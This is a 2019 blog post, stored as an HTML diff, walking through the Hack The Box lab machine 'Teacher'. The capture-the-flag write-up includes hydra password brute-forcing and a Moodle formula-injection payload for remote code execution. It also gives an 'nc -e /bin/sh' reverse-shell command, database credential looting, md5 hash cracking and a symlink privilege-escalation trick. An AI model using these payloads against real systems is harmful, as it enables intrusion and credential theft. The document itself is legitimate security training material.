@@ -1,0 +1,323 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width initial-scale=1" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  
+
+  <title>Hack The Box: Teacher - Walkthrough</title>
+  <meta name="description" content="One of the first hack the box machines that i’ve rooted. This box took me hella long, but in the end it paid off. Here is my walkthrough of the machine.
+
+">
+  <meta name="author" content="Jiebs">
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Hack The Box: Teacher - Walkthrough">
+  <meta name="twitter:description" content="One of the first hack the box machines that i’ve rooted. This box took me hella long, but in the end it paid off. Here is my walkthrough of the machine.
+
+">
+  
+  <meta name="twitter:creator" content="jiebss">
+  
+  <meta name="twitter:image" content="/images/favicons/favicon-194x194.png" />
+
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Hack The Box: Teacher - Walkthrough">
+  <meta property="og:description" content="One of the first hack the box machines that i’ve rooted. This box took me hella long, but in the end it paid off. Here is my walkthrough of the machine.
+
+">
+  <meta property="og:image" content="/images/favicons/favicon-194x194.png" />
+
+  <link rel="apple-touch-icon" sizes="57x57" href="/images/favicons/apple-touch-icon-57x57.png">
+  <link rel="apple-touch-icon" sizes="60x60" href="/images/favicons/apple-touch-icon-60x60.png">
+  <link rel="apple-touch-icon" sizes="72x72" href="/images/favicons/apple-touch-icon-72x72.png">
+  <link rel="apple-touch-icon" sizes="76x76" href="/images/favicons/apple-touch-icon-76x76.png">
+  <link rel="apple-touch-icon" sizes="114x114" href="/images/favicons/apple-touch-icon-114x114.png">
+  <link rel="apple-touch-icon" sizes="120x120" href="/images/favicons/apple-touch-icon-120x120.png">
+  <link rel="apple-touch-icon" sizes="144x144" href="/images/favicons/apple-touch-icon-144x144.png">
+  <link rel="apple-touch-icon" sizes="152x152" href="/images/favicons/apple-touch-icon-152x152.png">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicons/apple-touch-icon-180x180.png">
+  <link rel="icon" type="image/png" href="/images/favicons/favicon-32x32.png" sizes="32x32">
+  <link rel="icon" type="image/png" href="/images/favicons/favicon-194x194.png" sizes="194x194">
+  <link rel="icon" type="image/png" href="/images/favicons/favicon-96x96.png" sizes="96x96">
+  <link rel="icon" type="image/png" href="/images/favicons/android-chrome-192x192.png" sizes="192x192">
+  <link rel="icon" type="image/png" href="/images/favicons/favicon-16x16.png" sizes="16x16">
+  <link rel="manifest" href="/images/favicons/manifest.json">
+  <link rel="shortcut icon" href="/images/favicons/favicon.ico">
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+  
+  <link rel="stylesheet" href="/css/main.css?1578336926736764985">
+  <link rel="canonical" href="http://localhost:4000/2019/htb-teacher-walkthrough/">
+  <link rel="alternate" type="application/rss+xml" title="JiebsSecurity" href="/feed.xml">
+</head>
+
+
+  <body>
+    <span class="mobile btn-mobile-menu">
+  <i class="icon icon-list btn-mobile-menu__icon"></i>
+  <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+</span>
+
+<header class="panel-cover" style="background-image: url(/images/cover.jpg)">
+  <div class="panel-main">
+
+    <div class="panel-main__inner panel-inverted">
+    <div class="panel-main__content">
+        <a href="/" title="link to home of JiebsSecurity">
+          <img src="/images/profile.jpg" class="user-image" alt="My Profile Photo">
+          <h1 class="panel-cover__title panel-title">JiebsSecurity</h1>
+        </a>
+        <hr class="panel-cover__divider">
+        <p class="panel-cover__description">Life long student with a passion towards cyber security.</p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary">
+
+        <div class="navigation-wrapper">
+
+          <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+              <li class="navigation__item"><a href="/#blog" title="link to JiebsSecurity blog" class="blog-button">Blog</a></li>
+            </ul>
+          </nav>
+
+          <nav class="cover-navigation navigation--social">
+            <ul class="navigation">
+
+            
+              <!-- Twitter -->
+              <li class="navigation__item">
+                <a href="http://twitter.com/jiebss" title="@jiebss on Twitter" target="_blank">
+                  <i class="icon icon-social-twitter"></i>
+                  <span class="label">Twitter</span>
+                </a>
+              </li>
+            
+
+            
+
+            
+              <!-- LinkedIn -->
+              <li class="navigation__item">
+                <a href="https://www.linkedin.com/in/job-schellekens" title="job-schellekens on LinkedIn" target="_blank">
+                  <i class="icon icon-social-linkedin"></i>
+                  <span class="label">LinkedIn</span>
+                </a>
+              </li>
+            
+
+            
+              <!-- GitHub -->
+              <li class="navigation__item">
+                <a href="https://www.github.com/jiebss" title="jiebss on GitHub" target="_blank">
+                  <i class="icon icon-social-github"></i>
+                  <span class="label">GitHub</span>
+                </a>
+              </li>
+            
+
+            
+              <!-- Email -->
+              <li class="navigation__item">
+                <a href="mailto:jiebs@protonmail.com" title="Email jiebs@protonmail.com" target="_blank">
+                  <i class="icon icon-mail"></i>
+                  <span class="label">Email</span>
+                </a>
+              </li>
+            
+
+            <!-- RSS -->
+            <li class="navigation__item">
+              <a href="/feed.xml" title="Subscribe" target="_blank">
+                <i class="icon icon-rss"></i>
+                <span class="label">RSS</span>
+              </a>
+            </li>
+
+            </ul>
+          </nav>
+
+        </div>
+
+      </div>
+
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+
+
+    <div class="content-wrapper">
+      <div class="content-wrapper__inner">
+        <article class="post-container post-container--single">
+  <header class="post-header">
+    <div class="post-meta">
+      <time datetime="2019-05-29 17:04" class="post-meta__date date">29 May 2019</time>
+      
+    </div>
+    <h1 class="post-title">Hack The Box: Teacher - Walkthrough</h1>
+  </header>
+
+  <section class="post">
+    <p>One of the first hack the box machines that i’ve rooted. This box took me hella long, but in the end it paid off. Here is my walkthrough of the machine.</p>
+
+<p><img src="/assets/2/1.png" alt="" /></p>
+
+<h2>Enumeration</h2>
+<p>As always we will start off with our nmap scan.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mkdir scans
+nmap -sV -sC -oA scans/nmapinitial 10.10.10.153
+</code></pre></div></div>
+
+<p><img src="/assets/2/2.png" alt="" /></p>
+
+<p>HTTP is running on port 80. I decided to run dirb in the background and do some manual enumeration in the meantime.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dirb http://10.10.10.153
+</code></pre></div></div>
+
+<p>In our nmap result we noticed that the website is titled ‘blackhat highschool’. In the source on the gallery page i found something interesting.</p>
+
+<p><img src="/assets/2/3.png" alt="" /></p>
+
+<p>There is only 1 image with an onerror atribute to print something in the console. It’s also not displaying properly on the gallery page.</p>
+
+<p><img src="/assets/2/4.png" alt="" /></p>
+
+<p>When going directly to the image itself it gives us an error.</p>
+
+<p><img src="/assets/2/5.png" alt="" /></p>
+
+<p>Interesting. The file can be corrupted but i decided to do some more research to determine whether it’s something more.</p>
+
+<p><img src="/assets/2/6.png" alt="" /></p>
+
+<p><img src="/assets/2/7.png" alt="" /></p>
+
+<p>Great, we have a username and a password that is missing it’s last character. In the meantime our dirb scan has finished and it’s found the /moodle directory with a login function. I searched for possible exploits using searchsploit but most involved getting acces to a teachers account.</p>
+
+<p><img src="/assets/2/8.png" alt="" /></p>
+
+<p>Great, we have our entry point; the login page for the moodle directory and a username + password that is missing it’s final character. I decided to create a custom wordlist with all the possible characters and run it through hydra.</p>
+
+<p><img src="/assets/2/9.png" alt="" /></p>
+
+<p><img src="/assets/2/10.png" alt="" /></p>
+
+<p>Cool, we have the password. Let’s login!</p>
+
+<p><img src="/assets/2/11.png" alt="" /></p>
+
+<h2>Exploitation</h2>
+<p>After enumerating without any success I decided to search on Google and found an interesting article. You can visit the article by clicking <a href="https://blog.ripstech.com/2018/moodle-remote-code-execution/">here</a>.</p>
+
+<p>You can follow the video in the article for this part as it’s perfectly explained. I’ll go through this rather quickly.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Go to Algebra course &gt; select the quiz &gt; Edit Quiz &gt; Add a new question &gt; Choose Calculated &gt; Click Add &gt; Put something random in question name and text as they're required. 
+</code></pre></div></div>
+
+<p>In the Formula field, add:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/*{a*/`$_GET[t]`;//{x}}
+</code></pre></div></div>
+
+<p>Put grade to 100% and press Save Changes &gt; Next page and once done you’ll see a page with ‘ Edit the wildcards datasets’ somewhere in the center of the screen. Next we are able to pass system commands through a url parameter called ‘t’. For more information please visit the previously mentioned article.</p>
+
+<p>Add this to the end of the url and make sure your netcat is listening on the specified port.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&amp;t=(date;nc -e /bin/sh IP 9001)
+</code></pre></div></div>
+
+<p><img src="/assets/2/12.png" alt="" /></p>
+
+<p><img src="/assets/2/13.png" alt="" /></p>
+
+<p>Once you’ve send the request, our listener will get a callback and we get a reverse shell as www-data.</p>
+
+<p><img src="/assets/2/14.png" alt="" /></p>
+
+<p>As we are unable to view the home directory of giovanni, we have to escalate privileges.</p>
+
+<h2>Privilege Escalation to giovanni</h2>
+<p>I decided to go through the moodle directory in /var/www/html/moodle and check the config files and stuff to see if there is anything interesting.</p>
+
+<p><img src="/assets/2/15.png" alt="" /></p>
+
+<p>Nice, database credentials! Let’s see if there’s anything juicy stored in there.</p>
+
+<p><img src="/assets/2/16.png" alt="" /></p>
+
+<p>We can check out the list of databases with:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SHOW DATABASES;
+</code></pre></div></div>
+
+<p>Moodle is interesting and might have some passwords.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>USE moodle;
+</code></pre></div></div>
+
+<p>Check the tables.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SHOW TABLES;
+</code></pre></div></div>
+
+<p>We get a bunch of tables, mdl_user sounds interesting.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT * FROM mdl_user;
+</code></pre></div></div>
+
+<p>I went over the output and found an md5 hash. Searched online for an online md5 cracker and got a result.</p>
+
+<p><img src="/assets/2/17.png" alt="" /></p>
+
+<p>The password is ‘expelled’, we can su to giovanni.</p>
+
+<p><img src="/assets/2/18.png" alt="" /></p>
+
+<p>In giovanni’s home directory we find the user.txt!</p>
+
+<p><img src="/assets/2/19.png" alt="" /></p>
+
+<h2>Getting root.txt</h2>
+<p>In giovanni’s home directory there is a directory called work, which has two directoies courses and tmp. After enumerating for a while i found a backup.sh script in /usr/bin. When i took a look at this script i noticed that it’s backing up data and changing directories with 777 recursively.</p>
+
+<p>I watched alot of ippsec’s write-ups about retired machines. This situation reminded me of a write up about the Joker machine. The technique i learned in this video can be used here. We can create a symlink and trick the system into backing up the root directory in /home/giovanni/work/courses. Let’s create our symlink!</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ln -s /root/ courses
+</code></pre></div></div>
+
+<p>Once done, we just had to wait for a bit and we got root key!</p>
+
+<p><img src="/assets/2/20.png" alt="" /></p>
+
+<p>Thanks for reading and happy hacking!</p>
+
+
+  </section>
+  
+</article>
+
+
+
+      </div>
+
+      <footer class="footer">
+  <span class="footer__copyright">&copy; 2020 Jiebs. All rights reserved.</span>
+</footer>
+
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script type="text/javascript" src="/js/main.js?1578336926736764985"></script>
+
+
+    </div>
+  </body>
+</html>
